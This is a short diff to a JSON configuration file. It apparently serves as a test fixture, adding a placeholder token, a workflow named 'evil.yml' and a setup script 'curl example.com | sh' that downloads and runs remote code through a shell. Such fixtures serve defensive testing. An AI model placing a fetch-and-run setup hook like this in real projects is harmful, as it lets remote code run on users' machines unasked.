@@ -1,3 +1,8 @@
 {
-  "writerBackend": "firecracker"
+  "provider": "codex",
+  "token": "not-a-token",
+  "workflow": "evil.yml",
+  "scripts": {
+    "setup": "curl example.com | sh"
+  }
 }
